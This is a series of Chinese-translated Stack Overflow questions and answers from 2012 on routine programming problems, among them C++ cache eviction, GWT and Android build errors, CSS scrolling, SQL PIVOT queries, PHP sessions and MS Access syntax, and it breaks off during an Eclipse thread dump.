从设计的角度来看，决定可能归结为数据是否会*改变*。如果您正在存储某种类型文件的字节头，那么将其存储在源中可能是合理的，因为它永远不会改变。但是，一些预先计算的数据，特别是如果您以后可能再次生成它，您可能应该将它放在一个外部文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:59:46.917

**坏的：**

*   修改硬编码的数据集很麻烦

**好的：**

*   由于用户错误，您可以避免数据文件不存在、损坏或格式错误等愚蠢的事情。
*   不必加载/解析数据

**旁注：** 如果您担心性能，请确保使用数组，而不是列表：[数组与列表的性能](https://stackoverflow.com/questions/454916/performance-of-arrays-vs-lists)。

# php - 我的公司是 Rackspace Cloud 客户端（免费提供给我们），我正在尝试找到一些方法来设置版本控制

> ID：13756857
> 
> 赞同：2
> 
> 时间：2012-12-07T04:19:16.357
> 
> 标签：php, git, svn, version-control, rackspace-cloud

正如标题所说，我的（小型）企业提供了一个免费的 Rackspace Cloud 客户帐户。我们收到了相当数量的流量，但我还没有能够整合一个商业案例来转移到我们自己的服务器上。但是，我们正在开发一些复杂的应用程序，我对甚至无法通过 ssh 连接到远程服务器感到沮丧。最终，我想设置某种版本控制（此时，我会接受任何东西，git 或其他）。

我可以控制数据库、FTP、设置 cron 作业以及执行其他一些基本功能。如果没有 ssh 访问权限，我想不出任何方法来设置 git 或类似的东西。我的脑海中闪过一个想法，也许存在某种我可以设置的 PHP 版本控制，但我还没有找到它的运气。

你们有什么想法、想法或建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T08:17:09.217

那里没有完整的 php git 客户端。但是您可以只使用 ftp 进行部署。看看 git ftp：[https ://github.com/resmo/git-ftp](https://github.com/resmo/git-ftp)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T05:01:34.563

你的 git repos（或任何你想使用的东西）不需要在你的 Rackspace 服务器上。您可以使用各种托管服务之一，例如 GitHub 或 BitBucket，或者您可以将一台便宜的计算机放在办公室的角落并使用它。

# c++ - 为具有可变元素的优先级队列确定最佳 ADT (C++)

> ID：13756860
> 
> 赞同：3
> 
> 时间：2012-12-07T04:19:33.810
> 
> 标签：c++, caching, heap

第一次在这里发帖，我是初学者 - 希望我能让自己有用......

我试图找到并理解完成我所追求的工作的 ADT/概念。我猜它已经在那里了。

我有一个对象的数组/列表/树（待决定的容器），每个对象都有一个与在进程迭代中*未使用的数量相关的计数。*随着迭代的进行，每个对象的计数累加 1。想法是迟早我将需要任何未使用的对象正在使用的内存，因此我将删除它们以为不在 RAM 中的对象腾出空间（将有一个初始计数'0'） - 但是，如果事实证明我使用了一个仍在内存中的对象，它的计数将重置为'0'，我拍拍自己的背部，因为不必访问其内容的磁盘。

缓存？

主流程循环中将包含类似于以下内容的内容：

```
if (object needs to be added && (totalNumberOfObjects > someConstant))
    object with highest count deleted from RAM and the (heap??)
    newObject added with a count of '0'

if (an object already in RAM is accessed by the process)
    accessedObject count is set to '0'

for (All objects in RAM) 
    count++ 
```

我可能会大吵大闹（漫长而混乱的时间）并自己搞砸，但我认为从 word go 中学习最有效的方法会很有趣。

像堆一样的东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T05:53:31.567

您可以为此使用堆，但我认为这将是矫枉过正。听起来你不会有很多不同的计数值，并且每个计数都会有很多对象。如果这是真的，那么您只需要将对象线程化到具有相同计数的对象列表中。这些列表本身排列在一个出队中（或 C++ 坚持称之为“双端队列”）。

这里的关键是你需要增加所有对象的计数，如果可能的话，你可能希望它是 O(1)，而不是 O(N)。这是可能的：关键是每个列表的标题还包含其计数与下一个较小计数的差异。具有最小计数的列表的标题包含从 0 开始的增量，这是最小的计数。要增加所有对象的计数，您只需将该单个数字增加一即可。

要将对象的计数设置为 0，请从其列表中删除该对象（这意味着您始终需要通过其列表迭代器来引用对象，或者您需要实现自己的侵入式链表），然后 (1) 将其添加到底部列表，如果该列表的计数为 0，或者 (2) 创建一个计数为 0 的新底部列表，仅包含该对象。

创建新对象的过程是相同的，不同之处在于您不必将其从当前列表中取消链接。

要从内存中逐出对象，请选择顶部列表（即计数最多的列表）开头的对象。如果该列表为空，则将其从出队中弹出。如果需要更多内存，可以重复此操作。

所以所有操作，包括“增加所有计数”，都是 O(1)。不幸的是，存储开销是每个对象两个指针，加上每个唯一计数的两个指针和一个整数（在最坏的情况下，这与对象的数量相同，但在实践中可能要少得多）。由于很难想象任何其他算法使用少于一个指针加上每个对象的计数，这可能甚至不是时空权衡；额外的空间需求是最小的。

# java - GWT 开发模式在编译 GinjectorImpl.java 时抛出 ArrayIndexOutOfBoundsException

> ID：13756868
> 
> 赞同：2
> 
> 时间：2012-12-07T04:20:44.847
> 
> 标签：java, gwt, gwt-gin

在开发模式下打开我的 GWT 应用程序时出现以下异常。完全相同的代码可以使用 mvn gwt:compile 成功编译

> 引起：java.lang.ArrayIndexOutOfBoundsException: com.google.gwt.dev.asm.ClassReader.readClass(ClassReader.java:1976) 的 com.google.gwt.dev.asm.ClassReader.accept(ClassReader.java:) 的 3667 464) 在 com.google.gwt.dev.shell.rewrite.HasAnnotation.hasAnnotation(HasAnnotation.java:45) 在 com.google.com.google.gwt.dev.asm.ClassReader.accept(ClassReader.java:420) .gwt.dev.shell.CompilingClassLoader.findClass(CompilingClassLoader.java:1100) 在 com.google.gwt.dev.shell.CompilingClassLoader.loadClass(CompilingClassLoader.java:1203) 在 java.lang.ClassLoader.loadClass(ClassLoader.java :247) 在 java.lang.Class.forName0(Native Method) 在 java.lang.Class.forName(Class.java:247) 在 com.google.gwt.dev.shell.ModuleSpace.loadClassFromSourceName(ModuleSpace.java:665 ) 在 com.google.gwt.dev.shell.ModuleSpace。rebindAndCreate(ModuleSpace.java:468) at com.google.gwt.dev.shell.GWTBridgeImpl.create(GWTBridgeImpl.java:49) at com.google.gwt.core.shared.GWT.create(GWT.java:57)在 com.google.gwt.core.client.GWT.create(GWT.java:85) 在 ...

我过度使用 ModuleSpace.java 并在 Class.forName() 之前的第 665 行打印出类名，指出它正在尝试加载生成的 GinjectorImpl.java

我发现我生成的 GinjectorImpl.java 大约 9MB 和 100K+ 行代码。

当我从我的 GWT 应用程序中随机删除一些模块时，它又可以工作了，所以我猜它对于 ASM 来说太大而无法编译。

有什么建议么？谢谢

环境：GWT 2.5.0、GIN 1.5.0、gwt-maven-plugin 2.5.0、Java 6 SE

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-11T13:21:42.420

尝试删除`gwt-unitCache`文件夹并`gwt-compile`再次运行。这为我修好了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T05:00:18.810

将 GIN 升级到 2.0.0 解决了我的问题

生成的 Ginjector.java 的大小从 110K+ 行缩小到 23 行 :)

# android - android adt 17 - 将 jar 添加到项目 - dexedlibs/ 中的 jar 仅包含清单

> ID：13756873
> 
> 赞同：1
> 
> 时间：2012-12-07T04:21:13.467
> 
> 标签：android, jar, project, adt

我正在使用 java 1.7 在 win 7 x64 上使用 3 天前的 adt 17 下载。

将 jar 添加到我的新示例项目（通过将其复制到 libs/）编译正常，但在运行时抛出，因为 jar 中的类不在 dexedlibs/ 中的相应 jar 中 - 该 jar 仅包含一个清单。

相关链接：[http](http://android.foxykeep.com/dev/how-to-fix-the-classdefnotfounderror-with-adt-17) ://android.foxykeep.com/dev/how-to-fix-the-classdefnotfounderror-with-adt-17和[http://tools.android.com/recent/dealingwithdependenciesinandroidprojects](http://tools.android.com/recent/dealingwithdependenciesinandroidprojects)。

做一些链接中建议的出口和订购的东西并没有帮助。

这些天人们怎么知道如何将 jar 添加到 android 项目中？

编辑：感谢 max：jar 是使用 java 1.7 制作的，指定 1.6 停止了投掷，但由于某种原因，我仍然得到一些缺少的方法（这些没有被调用，但它们被引用）。

```
12-20 23:02:13.689: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 
12-20 23:02:13.689: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:13.689: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:13.949: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:13.949: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:14.829: I/dalvikvm(27907): Could not find method com.tayek.utilities.Utilities.store, referenced from method com.tayek.qanda.Model.toPropertiesFile
12-20 23:02:14.829: W/dalvikvm(27907): VFY: unable to resolve static method 3399: Lcom/tayek/utilities/Utilities;.store (Ljava/io/File;Ljava/util/Properties;)V
12-20 23:02:14.829: D/dalvikvm(27907): VFY: replacing opcode 0x71 at 0x000f
12-20 23:02:14.849: I/dalvikvm(27907): Could not find method com.tayek.utilities.Utilities.store, referenced from method com.tayek.qanda.Model.toPropertiesFile
12-20 23:02:14.849: W/dalvikvm(27907): VFY: unable to resolve static method 3399: Lcom/tayek/utilities/Utilities;.store (Ljava/io/File;Ljava/util/Properties;)V
12-20 23:02:14.849: D/dalvikvm(27907): VFY: replacing opcode 0x71 at 0x0014
12-20 23:02:14.849: I/dalvikvm(27907): Could not find method com.tayek.utilities.Utilities.store, referenced from method com.tayek.qanda.Model.toPropertiesFile
12-20 23:02:14.849: W/dalvikvm(27907): VFY: unable to resolve static method 3400: Lcom/tayek/utilities/Utilities;.store (Ljava/io/Writer;Ljava/util/Properties;)V
12-20 23:02:14.849: D/dalvikvm(27907): VFY: replacing opcode 0x71 at 0x000f
12-20 23:02:14.849: I/dalvikvm(27907): Could not find method com.tayek.utilities.Utilities.store, referenced from method com.tayek.qanda.Model.toPropertiesFile
12-20 23:02:14.849: W/dalvikvm(27907): VFY: unable to resolve static method 3400: Lcom/tayek/utilities/Utilities;.store (Ljava/io/Writer;Ljava/util/Properties;)V
12-20 23:02:14.849: D/dalvikvm(27907): VFY: replacing opcode 0x71 at 0x0014
12-20 23:02:14.929: I/System.out(27907): Hospital Mortality Risk
12-20 23:02:14.969: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:14.969: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:14.969: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:14.989: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.029: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.029: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.040: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.160: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.160: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.160: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.169: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.169: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.169: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.189: D/gralloc_goldfish(27907): Emulator without GPU emulation detected.
12-20 23:02:15.258: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0
12-20 23:02:15.299: W/Trace(27907): Unexpected value from nativeGetEnabledTags: 0 
```

更新：导入带有琐碎类的 jar 可以正常工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T13:01:28.950

如果您使用的是 Java 7，您可以尝试更改 Java 库项目的运行时环境：

1.  右键单击项目 -> 属性 -> Java 构建路径 -> 库

2.  选择 JRE System Library [JavaSE-1.7] 并点击编辑

3.  将执行环境更改为 JavaSE-1.6 (jre7)

这对我使用 ADT 21 有效。

# android - 使用 ViewFlipper 动态调整布局大小

> ID：13756875
> 
> 赞同：14
> 
> 时间：2012-12-07T04:21:20.843
> 
> 标签：android, user-interface, android-mapview, viewflipper

我有一个布局大小问题...

我有一个布局，它由一个 ViewFlipper、一个 LinearLayout（包含一个 MapView）和一个垂直行中的第二个 LinearLayout 组成。

```
<LinearLayout
    android:width="match_parent"
    android:height="match_parent" >

    <ViewFlipper
        android:width="match_parent"
        android:height="wrap_content" >
        // Top elements
    </ViewFlipper>

    <LinearLayout
        android:width="match_parent"
        android:height="match_parent" >
        // MapView
    </LinearLayout>

    <LinearLayout
        android:width="match_parent"
        android:height="wrap_content" >
        // Bottom elements
    </LinearLayout>

</LinearLayout> 
```

我看到的问题是，当我使用 showNext() 或 showPrevious() 更改 ViewFlipper 以显示较短的视图时，中间的 LinearLayout 不会扩展以填充空间。此外，当我更改为较短的视图时，我会看到前一个 ViewFlipper 视图留下的黑色/空白空间。

有没有一种巧妙的方法来动态调整这些元素的大小，以便 MapView 布局将扩展以填充 ViewFlipper 和底部 LinearLayout 未占用的所有空间？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2015-11-30T12:34:10.687

尝试添加`android:measureAllChildren="false"`到您的 ViewFlipper

```
<ViewFlipper
     android:width="match_parent"
     android:height="wrap_content"
     android:measureAllChildren="false" >
<!-- Top elements --> 
</ViewFlipper> 
```

# html - 具有垂直滚动元素的水平滚动站点

> ID：13756885
> 
> 赞同：1
> 
> 时间：2012-12-07T04:22:57.980
> 
> 标签：html, css, scroll, horizontal-scrolling

我正在尝试创建一个非常像这张图片的网站：

[Dropbox 上的布局图像](https://www.dropbox.com/s/qe9qpv6g3rte7yy/scrollingsample.jpg)

**问题：**

*   如图所示，我需要网站水平滚动。
*   我还需要垂直滚动元素来滚动，但在元素本身内部，而不是整个站点。当我在网站的第一帧中向上/向下滚动时，它会向下滚动到空白区域，因为第二帧太高了，并且迫使整个网站与最高元素一样高。

**HTML结构：**

```
div #horizontal-container
    div #horizontal-wrapper
        div #section-1 .section
        div #section-2 .section
        div #section-3 .section
        so on... 
```

**CSS：**

```
html, body {
    overflow: hidden;
}

#horizontal-container {
    position: fixed;
    top: 0; bottom: 0; left: 0; right: 0;
    overflow-y: hidden;
    overflow-x: scroll;
}

#horizontal-wrapper {
    width: 400%;
    height: 100%;
}

.section {
    width: 25%; /* A quarter of its parent with 400%, to be 100% of the window. */
    height: 100%;
    float: left;
    overflow-y: scroll;
} 
```

希望我在这里说清楚了。为了让这个工作，我缺少什么？当我点击某些水平滚动点时，我是否应该加入一些 JavaScript 来切换`overflow`容器的属性？听起来很乱。：/

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:57:28.753

height=100% 不会引入滚动到部分

您必须根据内容为部分分配不同的高度。

通过javascript检查如果部分的高度大于窗口高度，则将窗口高度分配给部分高度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-11T18:03:36.083

您可以尝试使用此代码使用水平滚动条生成固定宽度的内容块。[您可以在此处](http://www.htmlexplorer.com/2014/02/horizontal-scrolling-webpage-content.html)查看父帖子

```
<html>
<title>HTMLExplorer Demo: Horizontal Scrolling Content</title>
<head>
<style type="text/css">
#outer_wrapper {  
    overflow: scroll;  
    width:100%;
}
#outer_wrapper #inner_wrapper {
    width:6000px; /* If you have more elements, increase the width accordingly */
}
#outer_wrapper #inner_wrapper div.box { /* Define the properties of inner block */
    width: 250px;
    height:300px;
    float: left;
    margin: 0 4px 0 0;
    border:1px grey solid;
}
</style>
</head>
<body>

<div id="outer_wrapper">
    <div id="inner_wrapper">
        <div class="box">
            <!-- Add desired content here -->
            HTMLExplorer.com - Explores HTML, CSS, Jquery, XML, PHP, JSON, Javascript 
        </div>
        <div class="box">
             <!-- Add desired content here -->
            HTMLExplorer.com - Explores HTML, CSS, Jquery, XML, PHP, JSON, Javascript 
        </div>
        <div class="box">
            <!-- Add desired content here -->
            HTMLExplorer.com - Explores HTML, CSS, Jquery, XML, PHP, JSON, Javascript 
        </div>
        <div class="box">
            <!-- Add desired content here -->
            HTMLExplorer.com - Explores HTML, CSS, Jquery, XML, PHP, JSON, Javascript 
        </div>
        <div class="box">
             <!-- Add desired content here -->
            HTMLExplorer.com - Explores HTML, CSS, Jquery, XML, PHP, JSON, Javascript 
        </div>
        <div class="box">
            <!-- Add desired content here -->
            HTMLExplorer.com - Explores HTML, CSS, Jquery, XML, PHP, JSON, Javascript 
        </div>
        <!-- more boxes here -->
    </div>
</div>
</body>
</html> 
```

# django - 使用 now 选项为时间域创建自定义 django 小部件

> ID：13756889
> 
> 赞同：0
> 
> 时间：2012-12-07T04:23:04.347
> 
> 标签：django, django-forms, django-widget, django-models

我有带有日期时间字段和时间字段的模型。当用户在表单中与这些字段进行交互时，他们通常只需要输入当前时间。我需要一个与 django admin 中显示的几乎完全相同的 now 链接，因此用户只需单击它即可将当前时间输入该字段。

我尝试查看 django 源代码，但它似乎使用了一些我不太熟悉的前端 javascript。有没有一种简单的方法可以制作一个可以在时间字段和日期时间字段中轻松使用的小部件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T07:08:27.567

所以这不在管理面板上？和网站上的一样？那么这不是要向 Django 提出的问题，我建议标记 javascript。如果你不熟悉 javascript，那么标记 jquery，他们有这方面的东西。

如果您很懒惰，请从这里开始：

[这里](http://keith-wood.name/datetimeEntry.html)

[jQuery预制](https://stackoverflow.com/questions/1245245/jquery-date-time-picker)

[Javascript 方法](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date)

抱歉，这更像是一个 UI 问题而不是 Django 问题。不过，希望我有所帮助。

# sql - 如何将对角线行转换为单行？

> ID：13756896
> 
> 赞同：3
> 
> 时间：2012-12-07T04:24:20.580
> 
> 标签：sql, sql-server-2008

这是我的桌子。数字是对角线的。

```
Engineering  Financials  Scope  Schedule  Risks  People
--------------------------------------------------------
1            NULL        NULL   NULL      NULL   NULL
NULL         0           NULL   NULL      NULL   NULL
NULL         NULL        0      NULL      NULL   NULL
NULL         NULL        NULL   0         NULL   NULL
NULL         NULL        NULL   NULL      0      NULL
2            NULL        NULL   NULL      NULL   NULL
NULL         4           NULL   NULL      NULL   NULL
NULL         NULL        3      NULL      NULL   NULL
NULL         NULL        NULL   4         NULL   NULL
NULL         NULL        NULL   NULL      4      NULL
NULL         NULL        NULL   NULL      NULL   0
0            NULL        NULL   NULL      NULL   NULL
NULL         0           NULL   NULL      NULL   NULL
NULL         NULL        0      NULL      NULL   NULL
NULL         NULL        NULL   0         NULL   NULL
NULL         NULL        NULL   NULL      0      NULL
NULL         NULL        NULL   NULL      NULL   0
0            NULL        NULL   NULL      NULL   NULL
NULL         0           NULL   NULL      NULL   NULL
NULL         NULL        0      NULL      NULL   NULL
NULL         NULL        NULL   0         NULL   NULL
NULL         NULL        NULL   NULL      0      NULL
NULL         NULL        NULL   NULL      NULL   0
1            NULL        NULL   NULL      NULL   NULL
NULL         0           NULL   NULL      NULL   NULL
NULL         NULL        5      NULL      NULL   NULL
NULL         NULL        NULL   4         NULL   NULL
NULL         NULL        NULL   NULL      3      NULL
NULL         NULL        NULL   NULL      NULL   3 
```

我希望那些出现在这个输出中：

```
Engineering  Financials  Scope  Schedule  Risks  People
--------------------------------------------------------
1            0           0      0         0      NULL
2            4           3      4         4      0
0            0           0      0         0      0
0            0           0      0         0      0
0            0           0      0         0      0
1            0           5      4         3      3 
```

实际上，我想将这些对角线行转换为每个部分的单行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T09:54:46.917

结果，您想要的聚合似乎基于表中行的顺序。在表格中，行顺序无关紧要，假设顺序保持不变是危险的。

因此，除非您尚未向我们展示完整的源表（例如其中包含一`Section`列），否则很难为您提供对这个问题的有用答案。

* * *

**编辑：**

如果您*有*一`Section`列，您可以使用以下查询来获得您想要的结果：

```
SELECT   Section
         ,SUM(Engineering) AS Engineering
         ,SUM(Financials) AS Financials
         ,SUM(Scope) AS Scope
         ,SUM(Schedule) AS Schedule
         ,SUM(Risks) AS Risks
         ,SUM(People) AS People
FROM     YourTable
GROUP BY Section; 
```

除了使用该`SUM`函数来聚合您的数据，您还可以使用`MAX`其他函数，具体取决于数据以及您想从中获得什么。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-07T10:40:10.130

这太长了，无法发表评论，所以我正在回答。

目前尚不清楚您的数据来自何处，是数据表还是来自查询。您[之前的问题是关于 a`PIVOT`](https://stackoverflow.com/questions/13744503/need-help-for-converting-results-of-a-column-into-a-single-row-in-sql-server)并且您提供的数据与相同的数据匹配，所以我猜测这是来自该查询。

如果您正在使用`PIVOT`查询，并且子查询中有太多字段，则可能会发生这种行为。

**样本数据查询 1**：

```
CREATE TABLE yourtable ([Name] varchar(11), [Rating] int);

INSERT INTO yourtable ([Name], [Rating])
VALUES
    ('Engineering', 1),
    ('Financials', 3),
    ('Scope', 1),
    ('Schedule', 2),
    ('Risks', 3),
    ('People', 3); 
```

**将提供正确结果的**PIVOT****

 **```
select *
from
(
  select name, rating
  from yourtable
) src
pivot
(
  max(rating)
  for name in ([Engineering], [Financials], [Scope],
               [Schedule], [Risks], [People])
) piv 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/334cd/6)

结果如下：

```
| ENGINEERING | FINANCIALS | SCOPE | SCHEDULE | RISKS | PEOPLE |
----------------------------------------------------------------
|           1 |          3 |     1 |        2 |     3 |      3 | 
```

以上将是正确的语法，因为您有一行条目。现在，如果我稍微改变这个查询，你会看到不同：

**示例数据查询 2**：我在其中添加了一个`id`字段

```
CREATE TABLE yourtable([Name] varchar(11), [Rating] int, id int);

INSERT INTO yourtable([Name], [Rating], id)
VALUES
    ('Engineering', 1, 1),
    ('Financials', 3, 2),
    ('Scope', 1, 3), 
    ('Schedule', 2, 4),
    ('Risks', 3, 5),
    ('People', 3, 6); 
```

如果我执行`PIVOT`并包含此`ID`字段，结果将看起来像您的。

**枢轴**：

```
select [Engineering], [Financials], [Scope], [Schedule], [Risks], [People]
from
(
  select name, rating, id  -- notice the addition of the id column
  from yourtable
) src
pivot
(
  max(rating)
  for name in ([Engineering], [Financials], [Scope],
               [Schedule], [Risks], [People])
) piv 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/90931/1)

结果：

```
| ENGINEERING | FINANCIALS |  SCOPE | SCHEDULE |  RISKS | PEOPLE |
------------------------------------------------------------------
|           1 |     (null) | (null) |   (null) | (null) | (null) |
|      (null) |          3 | (null) |   (null) | (null) | (null) |
|      (null) |     (null) |      1 |   (null) | (null) | (null) |
|      (null) |     (null) | (null) |        2 | (null) | (null) |
|      (null) |     (null) | (null) |   (null) |      3 | (null) |
|      (null) |     (null) | (null) |   (null) | (null) |      3 | 
```

正如您所看到的，添加这个额外的列重现了您遇到的问题。我的建议是发布您的表结构，然后发布您用来获取结果的查询。从那时起，我们将能够为您提供帮助。**

# php - 源代码中的 JavaScript 代码不反映实际执行的代码

> ID：13756897
> 
> 赞同：-1
> 
> 时间：2012-12-07T04:24:25.223
> 
> 标签：php, javascript, jquery, session-variables

我的 javascript 代码似乎可以正常工作。但是，当我在 Chrome 中“查看源代码”时，它与实际执行的 javascript 不一致。

这是我的代码：

```
<?php
    $_SESSION['new'] = "blue";
    if (!isset($_SESSION['old'])) { $_SESSION['old'] = "blue"; }
        echo '<script type="text/javascript">
            $(document).ready(function() {
                changeCol("'.$_SESSION["old"].'","'.$_SESSION["new"].'");
            });
          </script>';
    $_SESSION['old'] = "blue";
?> 
```

`$_SESSION['old']="green"`从上一页。该代码应该调用`changeCol("green","blue")`，然后设置`$_SESSION['old']="blue"`。

事实上，这两件事都会发生，所以我的代码按设计工作，**但**如果我查看源代码，它会显示`changeCol("blue","blue")`. 这很奇怪，因为如果在 changeCol() 中我将传递的变量写入`console.log`，我得到`green, blue`.

那么，如果它正在调用`changeCol(green,blue)`，为什么它会`changeCol(blue,blue)`在我查看源代码时显示？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-07T04:27:16.227

当您查看源代码时，您可能会提出额外的请求。您的会话变量将被重置。

如果你使用的是 Chrome 或 Firefox——你应该是——你可以打开 Web Developer Tools 或 Firebug 并检查实际的 DOM 树。（这在脚本动态添加内容的情况下也非常有用。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:28:56.880

你`<?php session_start(); ?>`在第二页上写了吗？

# vba - MS Access 语法无效

> ID：13756899
> 
> 赞同：1
> 
> 时间：2012-12-07T04:24:47.790
> 
> 标签：vba, ms-access

在 Access 2007 中，下面的代码给出了错误 2434：您输入的表达式包含无效的语法。

```
 If (Eval("DLookUp(""[BaseRate]"",""RATELOOKUP"",""|DatePart(""yyyy"",[TxDate])| & |DatePart(""m"",[TxDate])| = [RATELOOKUP].[PERIOD]"") Is Null")) Then
        ' Checks for Current Base Rate
        Beep
        MsgBox "Interest Rate required for this month", vbExclamation, ""
    End If 
```

错误似乎在第一行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T05:12:31.783

在您给出的字符串表达式中正确引用`Eval()`可能非常具有挑战性。这是`Eval()`您的代码中实际看到的内容：

```
DLookUp("[BaseRate]","RATELOOKUP","|DatePart("yyyy",[TxDate])| & |DatePart("m",[TxDate])| = [RATELOOKUP].[PERIOD]") Is Null 
```

在使用 时考虑一种不同的方法`Eval()`，它可以让您准确地看到您要求`Eval()`评估的内容。

```
Dim strEval As String
strEval = "your expression here"
Debug.Print strEval ' <- examine the string Eval() receives
' finally ...
If Eval(strEval) ... 
```

但是，这件事对我来说看起来太复杂了，所以我怀疑应该有一个更简单的解决方案，甚至不需要`Eval()`. 不幸的是，您的`DLookup` *Criteria*论点令人困惑，我迷路了。但我怀疑这个`IsNull()`功能可能会给你你想要的东西而不需要`Eval()`：

```
If IsNull(DLookup("BaseRate","RATELOOKUP", "your Criteria here")) = True Then 
```

# sql - 如何在查询中放置两个选择并添加/更改列？

> ID：13756900
> 
> 赞同：0
> 
> 时间：2012-12-07T04:24:49.233
> 
> 标签：sql

如何在查询中放置两个选择，并添加/更改列？希望在下面解释我正在尝试做的一个例子。

```
Ex: Table [TESTS]
TESTID   TEST
   1     Login
   2     Password
   3     Create Account
   4     Edit Account
   5     Close Account

Would like to end up with a query result:
TestType   TESTID     TEST
  Init        1       Login
  Init        2       Pasword
  Func        3       Create Account
  Func        4       Edit Account
  Func        5       Close Account

/* This doesn't work: */
select 'Init' as [TestType], TESTID, TEST from TESTS where (TESTID >= 1 AND TESTID <= 2)
select 'Func' as [TestType], TESTID, TEST from TESTS where (TESTID >= 3 AND TESTID <= 5) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:32:58.643

尝试使用案例：

```
select 
   CASE WHEN (TESTID = 1 OR TESTID = 2) THEN 'Init' ELSE 'Func' END TestType
 , TESTID
 , TEST 
 from 
   TESTS 
```

# eclipse - 单击 TabItems 然后切换到列表时，Eclipse 在 Mac OS X 上挂起

> ID：13756907
> 
> 赞同：0
> 
> 时间：2012-12-07T04:25:31.560
> 
> 标签：eclipse, macos, jvm, swt

我正在 Mac OS X 10.7.3 上开发一个 eclipse 插件。UI 由一个带有 4 个 TabItems 的 TabFolder 和一些其他列表组成。当我在选项卡之间切换几次然后单击另一个列表时，eclipse 将挂起。从活动监视器中，我可以看到 CPU 使用率飙升至 100%，Real Mem 也在不断增加。JVM转储如下：

```
2012-12-07 10:14:14
Full thread dump Java HotSpot(TM) 64-Bit Server VM (20.4-b02-402 mixed mode):

"Attach Listener" daemon prio=9 tid=7fa8a4906800 nid=0x116fe7000 waiting on condition [00000000]
   java.lang.Thread.State: RUNNABLE

"[ThreadPool Manager] - Idle Thread" daemon prio=5 tid=7fa8a396a000 nid=0x116ae1000 in Object.wait() [116ae0000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d0133cb8> (a org.eclipse.equinox.internal.util.impl.tpt.threadpool.Executor)
    at java.lang.Object.wait(Object.java:485)
    at org.eclipse.equinox.internal.util.impl.tpt.threadpool.Executor.run(Executor.java:106)
    - locked <7d0133cb8> (a org.eclipse.equinox.internal.util.impl.tpt.threadpool.Executor)

"Worker-3" prio=5 tid=7fa89fe4f000 nid=0x114752000 in Object.wait() [114751000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:188)
    - locked <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:220)
    at org.eclipse.core.internal.jobs.Worker.run(Worker.java:50)

"org.eclipse.jface.text.reconciler.MonoReconciler" daemon prio=1 tid=7fa8a3a7c000 nid=0x11730c000 in Object.wait() [11730b000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d5c6c590> (a org.eclipse.jface.text.reconciler.DirtyRegionQueue)
    at org.eclipse.jface.text.reconciler.AbstractReconciler$BackgroundThread.run(AbstractReconciler.java:179)
    - locked <7d5c6c590> (a org.eclipse.jface.text.reconciler.DirtyRegionQueue)

"JavaScript indexing" daemon prio=4 tid=7fa8a2aca800 nid=0x11653f000 in Object.wait() [11653e000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d576a0c8> (a org.eclipse.wst.jsdt.internal.core.search.indexing.IndexManager)
    at java.lang.Object.wait(Object.java:485)
    at org.eclipse.wst.jsdt.internal.core.search.processing.JobManager.run(JobManager.java:370)
    - locked <7d576a0c8> (a org.eclipse.wst.jsdt.internal.core.search.indexing.IndexManager)
    at java.lang.Thread.run(Thread.java:680)

"Java indexing" daemon prio=4 tid=7fa8a1c47800 nid=0x1169de000 in Object.wait() [1169dd000]
   java.lang.Thread.State: WAITING (on object monitor)
